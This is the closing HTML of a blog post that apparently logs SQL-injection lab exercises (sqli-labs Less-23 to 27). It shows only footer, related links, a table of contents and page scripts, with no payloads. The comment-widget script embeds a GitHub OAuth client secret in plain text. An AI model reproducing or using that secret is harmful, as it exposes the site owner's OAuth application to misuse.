<a href=/blog/tags/sqli-labs/>sqli-labs</a>
</section>
<section class=article-copyright><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
<span>Licensed under CC BY-NC-SA 4.0</span>
</section>
</footer>
<link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.13.13/dist/katex.min.css integrity=sha384-RZU/ijkSsFbcmivfdRBQDtwuwVqK7GMOw6IMvKyeWL2K5UAlyp6WonmB8m7Jd0Hn crossorigin=anonymous><script src=https://cdn.jsdelivr.net/npm/katex@0.13.13/dist/katex.min.js integrity=sha384-pK1WpvzWVBQiP0/GjnvRxV4mOb0oxFuyRxJlk6vVw146n3egcN5C925NCP7a7BY8 crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/katex@0.13.13/dist/contrib/auto-render.min.js integrity=sha384-vZTG03m+2yp6N6BNi5iM4rW4oIwk5DfcNdFfxkk9ZWpDriOkXX8voJBFrAO7MpVl crossorigin=anonymous defer></script><script>window.addEventListener("DOMContentLoaded",()=>{renderMathInElement(document.querySelector(`.article-content`),{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1},{left:"\\(",right:"\\)",display:!1},{left:"\\[",right:"\\]",display:!0}]})})</script>
</article>
<aside class=related-contents--wrapper>
<h2 class=section-title>相关文章</h2>
<div class=related-contents>
<div class="flex article-list--tile">
<article>
<a href=/blog/p/sqli-labs-training-5/>
<div class=light>
<div class=lamp></div>
</div>
<div class=article-details>
<h2 class=article-title>sqli-labs 实验记录 #5</h2>
</div>
</a>
</article>
<article>
<a href=/blog/p/sqli-labs-training-3/>
<div class=light>
<div class=lamp></div>
</div>
<div class=article-details>
<h2 class=article-title>sqli-labs 实验记录 #3</h2>
</div>
</a>
</article>
<article>
<a href=/blog/p/sqli-labs-training-2/>
<div class=light>
<div class=lamp></div>
</div>
<div class=article-details>
<h2 class=article-title>sqli-labs 实验记录 #2</h2>
</div>
</a>
</article>
<article>
<a href=/blog/p/sqli-labs-training-1/>
<div class=light>
<div class=lamp></div>
</div>
<div class=article-details>
<h2 class=article-title>sqli-labs 实验记录 #1</h2>
</div>
</a>
</article>
<article>
<a href=/blog/p/redtiger-lab-training-note-2022-05-06/>
<div class=light>
<div class=lamp></div>
</div>
<div class=article-details>
<h2 class=article-title>red tiger 打靶日志</h2>
</div>
</a>
</article>
</div>
</div>
</aside>
<link rel=stylesheet href=https://unpkg.com/vssue/dist/vssue.min.css>
<div id=vssue></div>
<script src=https://unpkg.com/vue@2.6.14/dist/vue.runtime.min.js></script>
<script src=https://unpkg.com/vssue@1.4.8/dist/vssue.github.min.js></script>
<script>new Vue({el:"#vssue",render:a=>a("Vssue",{props:{title:"sqli-labs 实验记录 #4",options:{autoCreateIssue:!1,owner:"nnnewb",repo:"blog",clientId:"285910fdc1567a1a23e3",clientSecret:"f00da5438d9ac82c4a86024866c7a916ae411edc"}}})})</script>
<footer class=site-footer>
<section class=copyright>
&copy;
2021 -
2022 weakptr's 笔记
</section>
<section class=powerby>
GitHub Pages <br>
Built with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a> <br>
主题 <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.11.0>Stack</a></b> 由 <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a> 设计
，由 <a href=https://nnnewb.github.io/blog/>nnnewb</a> 修改
</section>
</footer>
<div class=pswp tabindex=-1 role=dialog aria-hidden=true>
<div class=pswp__bg></div>
<div class=pswp__scroll-wrap>
<div class=pswp__container>
<div class=pswp__item></div>
<div class=pswp__item></div>
<div class=pswp__item></div>
</div>
<div class="pswp__ui pswp__ui--hidden">
<div class=pswp__top-bar>
<div class=pswp__counter></div>
<button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
<button class="pswp__button pswp__button--share" title=Share></button>
<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
<div class=pswp__preloader>
<div class=pswp__preloader__icn>
<div class=pswp__preloader__cut>
<div class=pswp__preloader__donut></div>
</div>
</div>
</div>
</div>
<div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
<div class=pswp__share-tooltip></div>
</div>
<button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
</button>
<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
</button>
<div class=pswp__caption>
<div class=pswp__caption__center></div>
</div>
</div>
</div>
</div><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css integrity="sha256-c0uckgykQ9v5k+IqViZOZKc47Jn7KQil4/MP3ySA3F8=" crossorigin=anonymous><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.css integrity="sha256-SBLU4vv6CA6lHsZ1XyTdhyjJxCjPif/TRkjnsyGAGnE=" crossorigin=anonymous>
</main>
<aside class="sidebar right-sidebar sticky">
<section class="widget archives">
<div class=widget-icon><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg>
</div>
<h2 class="widget-title section-title">目录</h2>
<div class=widget--toc>
<nav id=TableOfContents>
<ol>
<li><a href=#前言>前言</a></li>
<li><a href=#less-23>Less-23</a></li>
<li><a href=#less-24>Less-24</a></li>
<li><a href=#less-25>Less-25</a></li>
<li><a href=#less-26>Less-26</a></li>
<li><a href=#less-27>Less-27</a></li>
<li><a href=#总结>总结</a></li>
</ol>
</nav>
</div>
</section>
</aside>
</div>
<script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.5/dist/vibrant.min.js integrity="sha256-5NovOZc4iwiAWTYIFiIM7DxKUXKWvpVEuMEPLzcm5/g=" crossorigin=anonymous></script><script type=text/javascript src=/blog/ts/main.js defer></script>
<script>(function(){const a=document.createElement('link');a.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",a.type="text/css",a.rel="stylesheet",document.head.appendChild(a)})()</script>
</body>
</html>